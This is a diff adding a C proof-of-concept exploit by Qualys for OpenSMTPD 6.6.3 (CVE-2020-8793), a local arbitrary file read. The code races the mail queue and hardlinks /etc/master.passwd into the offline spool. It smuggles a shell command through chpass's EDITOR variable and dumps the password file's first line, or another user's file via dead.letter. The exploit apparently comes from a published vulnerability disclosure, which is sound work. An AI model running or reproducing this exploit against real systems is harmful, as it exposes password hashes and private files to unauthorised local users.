@@ -1,0 +1,573 @@
+# Title: OpenSMTPD 6.6.3 - Arbitrary File Read
+# Date: 2020-02-20
+# Author: qualys
+# Vendor: https://www.opensmtpd.org/
+# CVE: 2020-8793
+
+/*
+ * Local information disclosure in OpenSMTPD (CVE-2020-8793)
+ * Copyright (C) 2020 Qualys, Inc.
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program.  If not, see <https://www.gnu.org/licenses/>.
+ */
+
+#include <sys/types.h>
+#include <sys/param.h>
+#include <sys/stat.h>
+#include <sys/sysctl.h>
+#include <sys/wait.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <fts.h>
+#include <limits.h>
+#include <pwd.h>
+#include <signal.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define P_SUSPSIG       0x08000000      /* Stopped from signal. */
+
+#define PATH_SPOOL              "/var/spool/smtpd"
+#define PATH_OFFLINE            "/offline"
+#define OFFLINE_QUEUEMAX        5
+
+#define die() do { \
+    printf("died in %s: %u\n", __func__, __LINE__); \
+    exit(EXIT_FAILURE); \
+} while (0)
+
+static const char * const *
+create_files(const size_t n_files)
+{
+    size_t f;
+    for (f = 0; f < n_files; f++) {
+        char file[] = PATH_SPOOL PATH_OFFLINE "/0.XXXXXXXXXX";
+        const int fd = mkstemp(file);
+        if (fd <= -1) die();
+
+        if (file[sizeof(file)-1] != '\0') die();
+        file[sizeof(file)-1] = '\n';
+        if (write(fd, file, sizeof(file)) != (ssize_t)sizeof(file)) die();
+        if (close(fd) != 0) die();
+    }
+
+    const char ** const files = calloc(n_files, sizeof(char *));
+    if (files == NULL) die();
+
+    char * const paths[] = { PATH_SPOOL PATH_OFFLINE, NULL };
+    FTS * const fts = fts_open(paths, FTS_PHYSICAL | FTS_NOCHDIR, NULL);
+    if (fts == NULL) die();
+
+    for (f = 0; ; ) {
+        const FTSENT * const ent = fts_read(fts);
+        if (ent == NULL) break;
+        if (ent->fts_name[0] != '0') continue;
+        if (ent->fts_name[1] != '.') continue;
+
+        if (ent->fts_info != FTS_F) die();
+        if (ent->fts_level != 1) die();
+        if (ent->fts_statp->st_gid != ent->fts_parent->fts_statp->st_gid) die();
+        if (ent->fts_statp->st_size <= 0) die();
+
+        const char * const file = strdup(ent->fts_path);
+        if (file == NULL) die();
+        if (f >= n_files) die();
+        files[f++] = file;
+    }
+    if (f != n_files) die();
+    if (fts_close(fts) != 0) die();
+
+    if (truncate(files[n_files - 1], 0) != 0) die();
+    return files;
+}
+
+static void
+wait_sentinel(const char * const * const files, const size_t n_files)
+{
+    for (;;) {
+        struct stat sb;
+        if (lstat(files[n_files - 1], &sb) != 0) {
+            if (errno != ENOENT) die();
+            return;
+        }
+        if (!S_ISREG(sb.st_mode)) die();
+        if (sb.st_size != 0) die();
+    }
+    die();
+}
+
+static void
+kill_wait(const pid_t pid)
+{
+    if (kill(pid, SIGKILL) != 0) die();
+
+    int status = 0;
+    if (waitpid(pid, &status, 0) != pid) die();
+    if (!WIFSIGNALED(status)) die();
+    if (WTERMSIG(status) != SIGKILL) die();
+}
+
+typedef struct {
+    int stop;
+    pid_t pid;
+    int fd;
+} t_stopper;
+
+static t_stopper
+fork_stopper(const uid_t uid)
+{
+    const int stop = (uid == getuid());
+
+    int fds[2];
+    if (pipe(fds) != 0) die();
+    const pid_t pid = fork();
+    if (pid <= -1) die();
+
+    const int fd = fds[!pid];
+    if (close(fds[!!pid]) != 0) die();
+
+    if (pid != 0) {
+        const t_stopper stopper = { .stop = stop, .pid = pid, .fd = fd };
+        return stopper;
+    }
+
+    int proc_mib[] = { CTL_KERN, KERN_PROC, KERN_PROC_RUID, uid, sizeof(struct kinfo_proc), 0 };
+    size_t proc_len = 0;
+    if (sysctl(proc_mib, 6, NULL, &proc_len, NULL, 0) == -1) die();
+    if (proc_len <= 0) proc_len = sizeof(struct kinfo_proc);
+    if (proc_len > ((size_t)1 << 20)) die();
+
+    const size_t proc_max = 0x10 * proc_len;
+    void * const proc_buf = malloc(proc_max);
+    if (proc_buf == NULL) die();
+    if (proc_mib[5] != 0) die();
+    proc_mib[5] = proc_max / sizeof(struct kinfo_proc);
+
+    for (;;) {
+        proc_len = proc_max;
+        if (sysctl(proc_mib, 6, proc_buf, &proc_len, NULL, 0) == -1) die();
+        if (proc_len <= 0) {
+            if (stop) die();
+            continue;
+        }
+        if (proc_len >= proc_max) die();
+
+        const struct kinfo_proc * kp;
+        if (proc_len % sizeof(*kp) != 0) die();
+        for (kp = proc_buf; kp != proc_buf + proc_len; kp++) {
+            if (*(const uint64_t *)kp->p_comm != *(const uint64_t *)"smtpctl") continue;
+            if (kp->p_flag & P_SUSPSIG) continue;
+
+            const pid_t pid = kp->p_pid;
+            if (stop && kill(pid, SIGSTOP) != 0) continue;
+
+            const int argv_mib[] = { CTL_KERN, KERN_PROC_ARGS, pid, KERN_PROC_ARGV };
+            static char argv_buf[ARG_MAX];
+            size_t argv_len = sizeof(argv_buf);
+            if (sysctl(argv_mib, 4, argv_buf, &argv_len, NULL, 0) == -1) {
+                continue;
+            }
+            if (argv_len <= sizeof(char *)) {
+                if (stop) die();
+                continue;
+            }
+            if (argv_len >= sizeof(argv_buf)) die();
+
+            const char * const * const av = (const void *)argv_buf;
+            size_t ac;
+            for (ac = 0; av[ac] != NULL; ac++) {
+                switch (ac) {
+                case 0:
+                    if (strcmp(av[ac], "sendmail") != 0) die();
+                    continue;
+                case 1:
+                    if (strcmp(av[ac], "-S") != 0) die();
+                    continue;
+                case 2:
+                    if (stop) {
+                        if (strncmp(av[ac], PATH_SPOOL PATH_OFFLINE,
+                                     sizeof(PATH_SPOOL PATH_OFFLINE)-1) != 0) die();
+                        static const char ** stopped;
+                        static size_t i_stopped, n_stopped;
+
+                        size_t i;
+                        for (i = 0; i < i_stopped; i++) {
+                            if (strcmp(av[ac], stopped[i]) == 0) break;
+                        }
+                        if (i < i_stopped) break;
+                        if (i != i_stopped) die();
+
+                        if (i_stopped >= n_stopped) {
+                            if (i_stopped != n_stopped) die();
+                            if (n_stopped > ((size_t)1 << 20)) die();
+                            n_stopped += ((size_t)1 << 10);
+                            stopped = reallocarray(stopped, n_stopped, sizeof(*stopped));
+                            if (stopped == NULL) die();
+                        }
+                        if (i_stopped >= n_stopped) die();
+                        stopped[i_stopped] = strdup(av[ac]);
+                        if (stopped[i_stopped] == NULL) die();
+                        i_stopped++;
+                    }
+                    const size_t len = strlen(av[ac]) + 1;
+                    if (write(fd, &pid, sizeof(pid)) != (ssize_t)sizeof(pid)) die();
+                    if (write(fd, av[ac], len) != (ssize_t)len) die();
+                    break;
+                default:
+                    die();
+                }
+                break;
+            }
+        }
+    }
+    die();
+}
+
+static void
+kill_stopper(const t_stopper stopper)
+{
+    kill_wait(stopper.pid);
+    if (close(stopper.fd) != 0) die();
+}
+
+typedef struct {
+    int kill;
+    pid_t pid;
+    char * args;
+} t_stopped;
+
+static t_stopped
+wait_stopped(const t_stopper stopper)
+{
+    pid_t pid = 0;
+    if (read(stopper.fd, &pid, sizeof(pid)) != (ssize_t)sizeof(pid)) die();
+    if (pid <= 0) die();
+
+    static char buf[ARG_MAX];
+    size_t len = 0;
+    for (;;) {
+        if (len >= sizeof(buf)) die();
+        const ssize_t nbr = read(stopper.fd, buf + len, 1);
+        if (nbr <= 0) die();
+        len += nbr;
+        if (buf[len - 1] == '\0') break;
+    }
+    if (len <= 0) die();
+    if (memchr(buf, '\0', len) != buf + len - 1) die();
+
+    char * const args = strdup(buf);
+    if (args == NULL) die();
+    const t_stopped stopped = { .kill = stopper.stop, .pid = pid, .args = args };
+    return stopped;
+}
+
+static void
+kill_free_stopped(const t_stopped stopped)
+{
+    if (stopped.kill && kill(stopped.pid, SIGKILL) != 0) die();
+    free(stopped.args);
+}
+
+static void
+make_stopper_file(const char * const file)
+{
+    const off_t file_size = (off_t)1 << 30;
+    const off_t line_size = (off_t)1 << 20;
+
+    struct stat sb;
+    if (lstat(file, &sb) != 0) die();
+    if (!S_ISREG(sb.st_mode)) die();
+    if (sb.st_size <= 0) die();
+    if (sb.st_size >= line_size) {
+        if (sb.st_size > file_size) return;
+        die();
+    }
+
+    const int fd = open(file, O_WRONLY | O_NOFOLLOW, 0);
+    if (fd <= -1) die();
+    off_t l;
+    for (l = 1; l <= file_size / line_size; l++) {
+        if (lseek(fd, line_size, SEEK_END) <= l * line_size) die();
+        if (write(fd, "\n", 1) != 1) die();
+    }
+    if (close(fd) != 0) die();
+}
+
+static size_t
+find_stopped_file(const char * const * const files, const size_t n_files,
+    const t_stopped stopped)
+{
+    size_t f;
+    for (f = 0; f < n_files; f++) {
+        if (strcmp(files[f], stopped.args) == 0) {
+            if (f >= n_files - 1) die();
+            return f;
+        }
+    }
+    die();
+}
+
+static void
+disclose_masterpasswd(const size_t n_files)
+{
+    if (getuid() == 0) die();
+    const char * const * const files = create_files(n_files);
+    size_t i;
+    for (i = 0; i < n_files - 1; i++) {
+        make_stopper_file(files[i]);
+    }
+
+    t_stopped queue_stopped[OFFLINE_QUEUEMAX];
+    size_t t = 0;
+    size_t q;
+    const t_stopper queue_stopper = fork_stopper(getuid());
+    puts("ready");
+
+    for (q = 0; q < OFFLINE_QUEUEMAX; q++) {
+        queue_stopped[q] = wait_stopped(queue_stopper);
+        const size_t f = find_stopped_file(files, n_files, queue_stopped[q]);
+        printf("%zu (%zu)\n", f, q);
+        if (f >= t) t = f + 1;
+    }
+    kill_stopper(queue_stopper);
+    if (t < OFFLINE_QUEUEMAX) die();
+    if (t >= n_files - 1) die();
+
+    wait_sentinel(files, n_files);
+
+    for (i = 0; i < n_files - 1; i++) {
+        if (unlink(files[i]) != 0) die();
+        if (i < t) continue;
+        if (link(_PATH_MASTERPASSWD, files[i]) != 0) die();
+
+        const pid_t pid = fork();
+        if (pid <= -1) die();
+        if (pid == 0) {
+            char * const argv[] = { "/usr/bin/chpass", NULL };
+            char * const envp[] = { "EDITOR=echo '#' >>", NULL };
+            execve(argv[0], argv, envp);
+            die();
+        }
+
+        int status = 0;
+        if (waitpid(pid, &status, 0) != pid) die();
+        if (!WIFEXITED(status)) die();
+        if (WEXITSTATUS(status) != 0) die();
+
+        struct stat sb;
+        if (lstat(files[i], &sb) != 0) die();
+        if (!S_ISREG(sb.st_mode)) die();
+        if (sb.st_nlink != 1) die();
+        if (sb.st_uid != 0) die();
+    }
+
+    const t_stopper target_dumper = fork_stopper(0);
+    for (q = 0; q < OFFLINE_QUEUEMAX; q++) {
+        kill_free_stopped(queue_stopped[q]);
+    }
+    const t_stopped target_dump = wait_stopped(target_dumper);
+    puts(target_dump.args);
+    kill_free_stopped(target_dump);
+    kill_stopper(target_dumper);
+
+    for (i = t; i < n_files - 1; i++) {
+        if (unlink(files[i]) != 0) die();
+    }
+    exit(EXIT_SUCCESS);
+}
+
+static void
+make_stopper_files(const char * const * const files, const size_t n_files,
+    const size_t begin_stoppers, const size_t n_stoppers)
+{
+    if (begin_stoppers >= n_files) die();
+    if (n_stoppers > OFFLINE_QUEUEMAX) die();
+
+    const size_t end_stoppers = begin_stoppers + 3 * n_stoppers;
+    if (end_stoppers >= n_files) die();
+
+    size_t f;
+    for (f = begin_stoppers; f < end_stoppers; f++) {
+        make_stopper_file(files[f]);
+    }
+}
+
+typedef struct {
+    pid_t pid;
+    int fd;
+} t_swapper;
+
+static t_swapper
+fork_swapper(const char * const target, const char * const file)
+{
+    struct stat sb;
+    if (lstat(target, &sb) != 0) die();
+    if (!S_ISREG(sb.st_mode)) die();
+    if (sb.st_nlink != 1) die();
+
+    int fds[2];
+    if (pipe(fds) != 0) die();
+    const pid_t pid = fork();
+    if (pid <= -1) die();
+
+    const int fd = fds[!pid];
+    if (close(fds[!!pid]) != 0) die();
+
+    if (pid != 0) {
+        const t_swapper swapper = { .pid = pid, .fd = fd };
+        return swapper;
+    }
+
+    if (unlink(file) != 0) die();
+    if (write(fd, "A", 1) != 1) die();
+
+    for (;;) {
+        if (link(target, file) != 0) die();
+        if (unlink(file) != 0) die();
+    }
+    die();
+}
+
+static void
+wait_swapper(const t_swapper swapper)
+{
+    char buf[] = "whatever";
+    if (read(swapper.fd, buf, sizeof(buf)) != 1) die();
+    if (buf[0] != 'A') die();
+}
+
+static void
+kill_swapper(const t_swapper swapper)
+{
+    kill_wait(swapper.pid);
+    if (close(swapper.fd) != 0) die();
+}
+
+static void
+disclose_deadletter(const size_t n_files, const char * const target)
+{
+    struct stat target_sb;
+    if (target[0] != '/') die();
+    if (lstat(target, &target_sb) != 0) die();
+    if (!S_ISREG(target_sb.st_mode)) die();
+    if (target_sb.st_nlink != 1) die();
+
+    const uid_t target_uid = target_sb.st_uid;
+    if (target_uid == getuid()) die();
+    const struct passwd * const target_pw = getpwuid(target_uid);
+    if (target_pw == NULL) die();
+
+    static char deadletter[PATH_MAX];
+    snprintf(deadletter, sizeof(deadletter), "%s/dead.letter", target_pw->pw_dir);
+    struct stat deadletter_sb;
+    if (lstat(deadletter, &deadletter_sb) != 0) {
+        if (errno != ENOENT) die();
+        memset(&deadletter_sb, 0, sizeof(deadletter_sb));
+    }
+
+    const char * const * const files = create_files(n_files);
+    make_stopper_files(files, n_files, 0, OFFLINE_QUEUEMAX);
+    const t_stopper queue_stopper = fork_stopper(getuid());
+    puts("ready");
+
+    t_stopped queue_stopped[OFFLINE_QUEUEMAX];
+    size_t t = 0;
+    size_t q;
+    for (q = 0; q < OFFLINE_QUEUEMAX; q++) {
+        queue_stopped[q] = wait_stopped(queue_stopper);
+        const size_t f = find_stopped_file(files, n_files, queue_stopped[q]);
+        printf("%zu (%zu)\n", f, q);
+        if (f >= t) t = f + 1;
+    }
+    if (t < OFFLINE_QUEUEMAX) die();
+    if (t >= n_files - 1) die();
+
+    size_t i;
+    for (i = 0; i < t; i++) {
+        if (unlink(files[i]) != 0) die();
+    }
+
+    wait_sentinel(files, n_files);
+    const t_stopper target_dumper = fork_stopper(target_uid);
+
+    for (;;) {
+        make_stopper_files(files, n_files, t + 1, 1);
+        const t_swapper swapper = fork_swapper(target, files[t]);
+        wait_swapper(swapper);
+        kill_free_stopped(queue_stopped[0]);
+        queue_stopped[0] = wait_stopped(queue_stopper);
+        kill_swapper(swapper);
+
+        const size_t f = find_stopped_file(files, n_files, queue_stopped[0]);
+        printf("%zu\n", f);
+        if (f <= t) die();
+        for (i = t; i <= f; i++) {
+            if (unlink(files[i]) != 0) {
+                if (errno != ENOENT) die();
+                if (i != t) die();
+            }
+        }
+        t = f + 1;
+
+        struct stat sb;
+        if (lstat(deadletter, &sb) != 0) {
+            if (errno != ENOENT) die();
+            memset(&sb, 0, sizeof(sb));
+        }
+        if (memcmp(&sb, &deadletter_sb, sizeof(sb)) != 0) break;
+    }
+    kill_stopper(queue_stopper);
+
+    const t_stopped target_dump = wait_stopped(target_dumper);
+    puts(target_dump.args);
+    kill_free_stopped(target_dump);
+    kill_stopper(target_dumper);
+
+    for (i = t; i < n_files - 1; i++) {
+        if (unlink(files[i]) != 0) die();
+    }
+    for (q = 0; q < OFFLINE_QUEUEMAX; q++) {
+        kill_free_stopped(queue_stopped[q]);
+    }
+
+    char * const argv[] = { "/bin/ls", "-l", deadletter, NULL };
+    char * const envp[] = { NULL };
+    execve(argv[0], argv, envp);
+    die();
+}
+
+int
+main(const int argc, const char * const argv[])
+{
+    setlinebuf(stdout);
+    puts("Local information disclosure in OpenSMTPD (CVE-2020-8793)");
+    puts("Copyright (C) 2020 Qualys, Inc.");
+
+    if (argc <= 1) die();
+    const size_t n_files = strtoul(argv[1], NULL, 0);
+    if (n_files <= OFFLINE_QUEUEMAX) die();
+    if (n_files > ((size_t)1 << 20)) die();
+
+    if (argc == 2) {
+        disclose_masterpasswd(n_files);
+        die();
+    }
+    if (argc == 3) {
+        disclose_deadletter(n_files, argv[2]);
+        die();
+    }
+    die();
+}
